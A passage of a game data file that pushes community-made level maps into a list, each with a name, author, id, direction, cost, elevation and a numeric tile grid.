,0,0,0,0,0,20,0,0,0,0,39,53,53,39,0,24,53,53,24,0,0,0,0,0,0,0,0,0,0,0,39,53,53,39,0,24,53,24,24,24,24,24,0,0,0,21,0,0,0,0,39,53,53,39,0,24,52,24,51,51,51,24,0,0,0,0,0,0,0,0,39,53,53,39,0,24,52,52,51,100,51,24,0,0,0,42,0,0,0,0,39,53,53,39,0,24,24,24,51,51,51,24,0,0,0,100,0,0,0,0,0,13,13,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Funny trigger",author="fantasy",id="#1650738265",direction="right",cost=412,elevation=-16,map=[24,2,2,24,24,24,24,24,24,24,24,24,24,99,24,24,24,24,24,24,24,22,22,22,94,22,22,94,22,22,22,22,22,22,22,22,22,22,22,24,24,22,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,93,24,24,94,20,18,18,18,18,18,18,18,18,18,18,18,18,18,18,20,22,24,24,22,20,18,16,16,16,16,16,16,16,16,16,16,16,16,18,20,22,24,24,22,20,18,16,14,14,14,14,14,14,14,14,14,14,16,18,20,22,24,24,94,20,18,16,14,12,12,12,12,12,12,12,12,14,16,18,20,22,24,24,22,20,18,16,14,12,10,10,10,10,10,10,12,14,16,18,20,22,24,97,22,20,18,16,14,12,10,8,8,8,8,10,12,14,16,18,20,22,24,24,22,20,18,16,14,12,10,8,6,6,8,10,12,14,16,18,20,22,24,24,22,20,18,16,14,12,10,8,6,6,1,10,12,14,16,18,20,22,104,24,22,20,18,16,14,12,10,8,1,6,96,1,12,14,16,18,20,22,24,24,22,20,18,16,14,12,10,10,10,1,6,6,1,14,16,18,20,22,24,24,22,20,18,16,14,12,12,12,12,12,1,6,98,1,16,93,20,22,24,24,22,93,18,16,14,14,14,14,14,14,14,1,6,6,1,18,20,22,24,24,22,20,18,16,16,16,16,16,16,16,93,16,1,6,101,1,20,22,24,24,22,20,18,18,18,18,18,18,18,18,18,18,18,1,6,6,1,1,1,24,22,20,20,20,20,20,20,20,20,20,20,20,20,20,1,6,103,6,2,24,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,1,1,6,2,24,24,24,24,24,24,24,24,24,102,24,24,24,24,24,24,24,24,1,1]});
maps.push({name="strafe strafe",author="Fara",id="#1650739318",direction="left",cost=171,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,2,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,2,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,34,34,34,34,34,34,34,0,0,0,98,0,0,0,0,34,34,34,0,0,0,0,0,96,0,0,0,0,0,0,98,0,0,0,0,0,34,0,0,0,0,0,0,96,0,0,0,0,0,0,98,0,0,0,0,0,34,0,0,0,0,0,0,96,0,0,0,0,0,0,98,0,0,0,0,0,19,0,0,0,0,0,0,96,0,0,0,0,0,0,98,0,0,0,0,0,34,0,0,0,34,34,34,34,34,0,0,0,0,0,98,0,0,0,0,0,34,0,0,0,34,100,34,34,34,0,0,0,0,99,34,34,34,0,0,0,19,0,0,0,34,97,34,34,34,0,0,0,67,34,34,34,34,67,0,0,34,0,0,0,0,0,0,34,0,0,0,0,0,67,67,67,67,0,0,0,34,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,34,19,34,19,34,19,34,19,34,19,34,19,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Unleashed",author="tilgep",id="#1650739631",direction="right",cost=248,elevation=-5,map=[0,0,0,0,0,19,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,19,19,0,0,0,0,0,0,0,96,19,19,64,19,19,19,0,0,0,19,19,19,0,0,0,0,0,0,0,0,96,19,19,19,19,19,19,19,19,19,96,19,0,0,0,0,0,0,0,0,19,96,19,19,64,19,19,19,19,96,19,19,0,0,0,0,0,0,0,0,19,19,96,19,19,96,96,96,96,19,19,19,0,0,0,0,0,0,0,0,19,19,19,96,96,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,64,19,19,19,98,0,0,0,0,0,0,0,0,0,19,19,64,19,19,19,19,19,98,98,0,0,0,0,0,0,0,0,40,0,19,19,19,19,19,19,98,98,19,0,0,0,0,0,0,0,0,0,0,1,0,19,19,19,19,98,19,19,18,18,0,0,0,0,0,0,0,41,0,0,1,96,96,96,1,19,0,64,18,18,18,0,0,0,0,0,0,97,0,1,19,19,19,19,19,1,98,0,0,18,18,17,16,15,14,14,0,0,1,0,19,19,19,19,19,18,18,98,18,18,18,17,16,15,14,2,0,0,0,0,0,19,19,19,19,99,18,98,18,18,18,17,16,15,14,2,0,0,0,0,0,0,19,19,19,18,18,98,18,18,18,17,16,15,14,14,0,0,0,0,0,0,0,0,0,0,98,0,0,0,0,0,0,0,0,0]});
maps.push({name="Throw Grenades",author="fantasy",id="#1650739974",direction="right",cost=435,elevation=-9,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,3,5,5,5,3,5,5,3,5,5,5,3,5,5,5,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,24,24,19,66,19,24,24,24,24,24,24,24,24,19,66,19,24,24,1,1,0,24,24,69,24,24,0,0,0,0,0,0,24,24,69,24,24,0,1,1,0,24,24,69,24,24,0,0,0,0,0,0,24,24,69,24,24,0,1,1,24,24,19,66,19,24,24,24,24,24,24,24,24,19,66,19,24,24,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,1,1,24,24,16,66,16,24,24,24,24,24,24,24,24,16,66,16,24,24,1,1,0,24,21,69,21,24,0,0,0,0,0,0,24,21,69,21,24,0,1,1,0,24,21,69,21,24,0,0,0,0,0,0,24,21,69,21,24,0,1,1,24,24,16,66,16,24,24,24,24,24,24,24,24,16,66,16,24,24,1,1,1,1,16,16,16,16,16,16,16,16,16,16,16,16,16,16,1,1,2,1,97,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,96,15,2,1,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,1]});
maps.push({name="ay Race",author="tilgep",id="#1650741966",direction="left",cost=297,elevation=-14,map=[24,24,24,24,24,0,1,0,2,2,22,22,0,0,0,0,0,0,0,0,24,7,7,7,7,0,0,0,22,22,22,22,21,21,21,21,21,21,21,0,24,7,7,7,7,0,0,0,22,22,22,22,21,21,21,21,21,21,21,0,24,7,4,7,24,0,0,1,22,22,22,22,21,21,21,21,21,20,20,0,100,24,24,24,24,0,0,0,1,0,0,0,1,1,1,0,0,20,20,20,24,24,24,24,24,0,0,0,0,1,1,1,0,0,0,1,0,20,20,20,8,3,8,3,8,1,0,13,13,14,14,14,14,14,0,1,0,20,20,20,8,8,8,8,8,0,1,13,13,14,14,14,14,14,14,1,0,20,20,20,8,8,44,8,8,1,13,13,13,13,0,1,14,14,14,1,0,0,20,20,8,8,8,8,8,1,13,13,0,0,1,0,15,15,15,1,0,0,20,20,2,8,8,8,1,0,13,13,0,1,0,15,15,15,0,1,0,0,19,19,2,8,44,8,1,13,13,13,1,0,15,15,15,15,0,1,0,0,19,19,8,8,8,1,13,13,13,13,1,0,15,15,15,0,1,0,0,19,19,19,24,8,8,1,13,13,0,1,0,15,15,15,15,0,1,0,19,19,19,19,24,9,9,1,12,12,1,0,0,15,15,15,0,0,1,0,19,19,19,19,24,3,9,1,12,12,0,1,16,16,0,0,0,1,0,0,19,19,19,0,24,9,9,1,11,11,1,0,16,16,0,1,1,0,0,0,18,18,0,0,0,10,10,10,11,11,0,1,16,16,16,0,0,0,0,18,18,18,0,0,0,10,10,10,11,11,1,0,16,16,16,17,17,17,17,18,18,18,0,0,0,0,0,0,0,1,0,0,16,16,16,17,17,17,17,18,18,18,0,0]});
maps.push({name="Inferno v1",author="fantasy",id="#1650742365",direction="left",cost=267,elevation=-12,map=[0,18,20,22,24,24,24,24,24,24,95,24,99,0,0,0,0,2,2,0,0,16,1,0,0,0,24,0,0,0,1,0,0,0,0,0,0,44,44,0,0,14,0,1,0,0,24,0,0,1,0,0,0,0,0,0,0,44,44,0,0,12,0,0,1,0,96,0,1,0,0,0,0,0,0,0,0,92,92,0,0,12,0,0,0,1,64,1,0,0,0,0,0,77,0,0,0,0,0,0,2,12,0,0,1,64,64,64,0,0,0,0,77,24,77,0,0,0,0,0,2,12,0,1,64,64,64,64,0,0,0,0,0,77,0,0,0,0,0,0,0,12,0,1,93,64,64,64,0,0,0,0,0,0,0,0,0,0,0,0,0,13,0,0,1,64,64,64,0,0,0,77,0,0,0,0,0,0,0,0,0,14,0,77,24,1,64,1,0,0,77,24,77,0,0,0,0,44,44,0,0,15,0,77,24,1,44,0,0,0,0,77,0,0,0,0,0,64,64,1,0,16,0,77,24,1,44,0,0,0,0,0,0,0,0,0,0,64,64,1,0,17,0,77,24,1,44,44,0,0,0,0,0,0,92,44,64,64,64,1,0,18,0,77,24,1,44,44,0,0,0,0,0,0,92,44,64,64,64,0,1,19,1,77,24,1,0,0,0,0,0,0,0,0,0,0,0,64,64,0,1,98,1,77,24,1,0,0,0,0,0,0,0,0,0,0,0,44,44,0,1,19,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,19,19,19,19,9,76,76,9,9,9,9,9,9,9,0,0,0,0,0,0,19,19,19,19,3,9,9,9,76,76,76,76,76,9,0,0,0,65,65,0,94,19,19,19,9,76,76,9,97,9,9,9,9,9,9,9,9,9,9,0]});
maps.push({name="rotate",author="issic",id="#1650744761",direction="right",cost=145,elevation=-5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,44,85,44,0,0,0,0,14,14,0,0,0,92,44,0,44,0,0,0,44,100,1,85,0,0,0,0,12,12,0,0,0,0,0,1,100,44,0,0,44,1,67,44,0,0,0,0,12,12,0,0,0,0,0,67,1,0,0,0,0,44,44,0,0,0,0,0,10,10,0,0,0,0,0,0,0,44,0,0,0,92,0,0,0,0,0,0,12,12,0,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,93,0,0,0,0,0,0,14,14,0,0,0,0,0,0,44,0,0,0,25,25,25,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,25,97,25,0,0,0,0,0,14,14,36,0,38,0,40,0,42,0,0,0,25,25,25,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,92,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,14,14,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,14,14,0,0,0,0,0,1,0,0,0,0,44,1,67,0,0,0,0,0,14,89,12,12,10,10,9,95,89,9,2,0,44,100,1,0,0,0,0,0,14,14,12,12,10,10,9,95,9,86,2,0,0,44,0,44,0,44,0,44,0,0,0,0,0,0,0,1,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,0]});
maps.push({name="santa",author="FLaN KS",id="#1650745147",direction="forward",cost=245,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,5,76,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,5,76,76,76,76,76,0,91,45,45,0,0,0,5,0,0,0,0,0,5,76,76,76,76,76,76,0,45,1,45,0,0,0,0,5,0,0,0,0,5,76,76,76,76,76,76,0,45,45,45,0,0,0,0,0,5,0,0,0,5,76,76,76,76,76,76,0,45,45,100,0,0,0,0,0,5,5,0,0,5,76,76,76,76,76,76,0,45,45,45,0,0,0,0,0,5,0,0,0,5,76,76,76,76,76,76,0,45,1,45,0,0,0,0,5,0,0,0,0,0,5,76,76,76,76,76,0,91,45,45,0,0,0,5,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Cold Hold",author="Midran Kidran",id="#1650745358",direction="forward",cost=254,elevation=9,map=[2,2,1,1,0,0,0,0,14,14,0,14,0,0,14,0,14,14,14,0,5,5,1,1,0,0,0,0,14,14,0,14,0,14,14,0,0,14,14,14,5,5,1,1,0,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,5,1,1,1,0,0,0,0,14,14,1,1,1,0,0,0,0,14,14,0,5,5,5,1,0,0,0,0,14,14,14,14,1,1,1,0,0,0,14,14,5,5,5,1,0,0,0,0,0,0,1,96,1,97,1,0,0,14,14,14,5,5,5,1,0,0,0,0,0,0,1,14,1,15,1,0,0,14,14,0,5,5,5,1,0,0,0,0,0,0,1,14,1,0,1,0,0,14,14,14,1,1,5,1,0,0,1,1,1,1,1,14,1,15,1,0,0,1,95,1,5,5,5,1,0,0,0,0,0,0,0,14,1,0,1,0,0,1,14,1,5,5,5,1,1,0,0,0,0,15,1,14,1,14,1,0,0,1,14,1,0,0,0,1,1,0,0,0,0,0,1,14,1,0,1,0,0,1,14,1,0,0,0,1,1,0,0,0,0,0,1,14,1,0,1,0,0,0,14,14,5,5,5,1,1,0,0,0,0,14,14,95,1,14,1,0,0,0,14,14,5,5,5,1,1,0,0,0,0,1,1,14,1,0,1,0,0,0,14,0,5,1,1,1,0,0,0,0,0,1,14,14,14,14,1,0,0,0,14,14,5,1,1,1,1,1,1,1,1,1,14,14,1,1,1,0,0,0,0,14,5,1,1,1,5,5,1,5,5,14,14,14,1,0,0,0,0,0,14,14,5,1,1,1,5,5,95,5,3,14,14,14,1,0,0,0,0,0,14,14,5,5,5,5,5,5,1,5,5,14,14,14,1,0,0,0,0,0,2,2]});
maps.push({name="I Dont Even Know",author="DankArab",id="#1650746318",direction="right",cost=427,elevation=3,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,3,1,1,66,66,66,66,66,66,48,1,1,48,48,48,66,66,66,66,66,48,48,66,66,1,1,1,1,1,100,1,1,48,48,48,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,93,48,0,1,1,1,1,1,1,48,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,95,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,85,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,94,48,0,1,1,1,1,1,1,48,48,1,1,1,1,1,1,1,1,1,48,48,48,1,1,1,1,1,1,48,1,1,1,1,1,1,1,1,1,1,48,48,48,66,66,66,66,66,48,48,66,66,66,1,1,1,1,2,1,1,1,1,1,1,1,1,1,48,1,1,1,1,66,66,66,66,48,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Moldy Boldy",author="Midran Kidran",id="#1650748252",direction="forward",cost=228,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,10,10,0,0,0,0,0,1,1,1,1,97,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,99,0,1,0,1,0,0,0,0,10,10,10,10,0,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,10,1,10,1,0,10,0,10,10,10,10,10,10,0,10,0,1,10,1,10,0,1,0,1,1,0,1,0,0,0,0,0,0,1,0,1,1,0,1,0,0,1,10,10,0,10,1,1,10,10,10,10,1,1,10,0,10,10,1,0,10,1,1,1,1,1,1,1,10,10,10,10,1,1,1,1,1,1,1,10,95,1,0,0,0,0,0,1,1,95,95,1,1,0,0,0,0,0,1,95,10,1,0,0,1,1,1,1,10,0,0,10,1,1,1,1,0,0,1,10,10,1,0,0,1,10,10,10,10,10,10,10,10,10,10,1,0,0,1,10,0,1,1,1,1,10,1,1,1,10,10,1,1,1,10,1,1,1,1,0,10,10,10,10,10,10,1,0,1,10,10,1,0,1,10,10,10,10,10,10,1,1,1,1,1,1,1,0,1,10,10,1,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,98,98,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,96,96,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Parkour PARKOUR",author="WrexGigarton",id="#1650750505",direction="forward",cost=922,elevation=5,map=[2,2,1,102,76,43,76,42,76,41,41,76,39,76,36,76,34,76,33,104,7,7,44,44,76,43,76,42,76,41,41,76,39,76,36,76,34,76,33,33,7,7,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,7,90,76,76,76,76,76,76,76,43,43,1,43,76,44,100,44,76,34,34,7,7,6,5,76,76,76,76,76,76,76,1,76,76,76,76,76,76,76,76,90,7,6,5,76,76,76,76,76,42,42,1,42,76,40,76,38,76,36,36,7,7,76,76,76,76,76,76,76,76,76,1,42,76,40,76,38,76,36,36,90,7,76,76,76,76,76,76,76,40,40,76,1,1,1,1,1,1,76,76,7,7,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,12,12,7,92,35,35,76,36,76,37,76,58,58,76,36,76,35,76,34,76,12,12,7,92,35,35,76,36,76,37,76,58,58,76,36,76,35,76,34,76,12,12,7,7,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,103,103,7,7,76,76,76,76,76,76,76,36,36,76,76,76,76,76,76,76,12,12,91,91,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,101,101,7,7,6,5,76,76,76,76,76,34,34,76,76,76,76,76,76,76,12,12,91,91,6,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,98,98,7,7,76,76,76,76,76,76,76,32,32,76,76,76,76,76,76,76,12,12,91,91,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,96,96,7,7,76,76,76,76,76,76,76,31,31,76,76,76,76,76,76,76,12,12,97,7,76,28,76,29,76,30,76,31,99,76,76,76,76,76,76,76,2,2]});
maps.push({name="Tetris",author="tilgep",id="#1650751009",direction="left",cost=149,elevation=-10,map=[0,0,0,0,0,0,0,0,21,0,0,0,23,0,2,2,0,0,0,0,19,0,0,20,20,20,20,0,21,21,0,0,23,0,23,23,0,23,23,23,19,0,1,0,0,0,0,0,21,0,0,23,23,0,23,23,0,0,0,23,19,19,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,0,0,21,21,21,0,0,21,21,21,0,0,0,1,0,19,19,19,0,20,20,0,0,21,0,1,0,0,21,0,0,17,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,1,17,0,17,17,0,1,1,0,20,0,1,0,20,0,0,0,20,0,0,0,17,0,0,17,0,0,0,0,0,0,0,20,20,0,0,20,20,20,0,0,17,0,0,17,0,17,0,0,0,19,0,20,0,0,0,0,0,0,0,19,0,0,1,0,0,17,0,19,19,19,0,0,0,19,19,0,0,0,19,19,1,0,0,0,0,17,0,0,0,0,0,0,0,19,19,0,19,0,19,0,0,15,15,15,0,17,0,1,1,0,17,17,0,0,0,1,19,0,0,0,0,15,0,0,1,0,0,1,1,0,17,17,0,0,0,0,19,19,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,1,0,0,0,20,20,2,13,13,0,0,0,17,17,0,1,0,0,0,19,0,1,0,20,20,0,2,13,13,0,0,1,0,17,17,0,0,18,0,19,0,0,0,0,0,0,0,0,0,0,15,0,0,0,0,0,18,18,0,19,19,0,20,20,20,20,1,0,15,15,15,0,17,17,17,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,17,0,0,0,0,0,19,19,19,19,0,0]});
maps.push({name="Foxy Boxy",author="Midran Kidran",id="#1650751615",direction="right",cost=415,elevation=19,map=[2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,1,1,1,1,1,1,1,1,24,24,24,24,90,24,24,1,1,5,5,1,1,1,5,5,5,5,5,1,24,1,24,1,24,1,24,98,2,5,5,1,1,1,95,1,5,5,5,1,24,24,24,24,24,24,24,98,2,5,5,1,1,1,5,1,5,90,5,1,24,1,24,1,24,1,24,1,1,5,5,1,97,1,5,1,5,90,5,1,24,24,24,24,24,24,24,1,0,5,5,1,5,1,5,1,5,5,90,1,24,1,24,1,24,1,24,1,0,5,5,1,0,1,5,1,5,5,5,1,90,24,24,24,24,24,24,1,0,90,5,1,0,1,5,1,5,5,5,1,24,1,24,1,24,1,24,1,0,90,5,1,5,1,5,1,5,3,5,1,24,24,24,24,24,24,24,1,0,5,5,1,0,1,5,1,90,19,19,1,24,1,24,1,24,1,24,1,0,5,5,1,0,1,5,1,19,19,19,1,24,24,24,24,24,24,24,1,0,5,90,1,5,1,5,1,19,90,19,1,24,1,24,1,24,1,24,1,1,5,5,1,0,1,5,1,19,19,19,1,24,24,24,24,24,24,24,1,99,5,5,1,5,1,5,1,19,90,19,1,24,1,24,1,90,1,24,1,24,5,5,5,5,1,5,1,19,19,19,1,24,24,24,24,24,24,24,1,0,5,5,1,0,1,5,1,1,95,1,1,1,1,91,91,91,1,1,1,24,5,5,1,1,1,5,1,19,19,19,24,24,24,24,24,24,24,24,1,0,5,5,96,5,5,5,1,19,19,3,24,24,24,24,24,24,24,24,1,0,5,5,96,5,5,5,1,19,19,19,24,24,24,24,24,24,24,24,24,24]});
maps.push({name="Squiddysquad tryouts",author="stu",id="#1650755073",direction="forward",cost=38,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Pillars",author="Wolfdiman",id="#1650755719",direction="left",cost=194,elevation=10,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,5,2,2,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,3,5,3,11,0,0,0,0,0,0,55,55,55,0,0,0,0,0,0,11,45,45,45,11,0,0,0,0,0,55,55,55,55,55,0,0,0,0,0,45,45,45,45,45,0,15,15,15,55,55,21,21,21,55,55,0,0,0,45,45,11,11,11,45,45,2,15,15,55,55,21,41,21,55,55,0,0,0,45,45,11,31,11,45,45,2,15,15,55,55,21,21,21,55,55,0,0,0,45,45,11,11,11,45,45,0,0,0,0,55,55,55,55,55,0,0,0,0,0,45,45,45,45,45,0,0,0,0,0,0,55,55,55,0,0,0,0,0,0,0,45,45,45,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,46,46,46,0,0,0,0,0,0,0,53,53,53,0,0,0,0,0,0,0,47,47,47,0,0,0,0,0,0,0,52,52,52,0,0,0,0,0,0,0,48,48,48,0,0,0,0,0,0,52,52,52,52,52,0,0,0,0,0,48,48,48,48,48,0,0,0,0,52,52,18,18,18,52,52,51,50,49,48,48,14,14,14,48,48,0,0,0,52,52,18,38,18,52,52,51,50,49,48,48,14,34,14,48,48,0,0,0,52,52,18,18,18,52,52,51,50,49,48,48,14,14,14,48,48,0,0,0,0,52,52,52,52,52,0,0,0,0,0,48,48,48,48,48,0,0,0,0,0,0,52,52,52,0,0,0,0,0,0,0,48,48,48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="hobs",author="FLaN KS",id="#1650758524",direction="forward",cost=401,elevation=0,map=[24,2,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,24,24,23,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,23,24,24,23,22,21,21,21,21,21,21,21,21,21,21,21,21,21,21,22,23,24,24,23,22,21,21,19,19,19,19,19,19,19,19,19,19,19,21,22,23,24,24,23,22,21,21,19,18,18,18,18,18,18,18,18,18,19,21,22,23,24,24,23,22,21,21,19,18,17,17,17,17,17,17,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,16,16,16,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,15,15,15,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,15,14,15,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,15,100,15,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,15,15,15,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,16,16,16,16,16,17,18,19,21,22,23,24,24,23,22,21,21,19,18,17,17,17,17,17,17,17,18,19,21,22,23,24,24,23,22,21,21,19,18,18,18,18,18,18,18,18,18,19,21,22,23,24,24,23,22,21,21,19,19,19,19,19,19,19,19,19,19,19,21,22,23,24,24,23,22,21,21,21,21,21,21,21,21,21,21,21,21,21,21,22,23,24,24,23,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,23,24,24,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,2,24]});
